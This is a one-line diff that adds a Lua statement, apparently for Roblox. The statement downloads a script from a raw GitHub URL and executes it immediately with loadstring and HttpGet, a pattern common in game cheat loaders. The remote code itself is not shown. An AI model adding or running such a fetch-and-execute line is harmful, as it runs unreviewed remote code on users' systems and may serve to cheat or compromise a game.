@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xUnanimous/es/main/uni-sa0/main.lua"))()
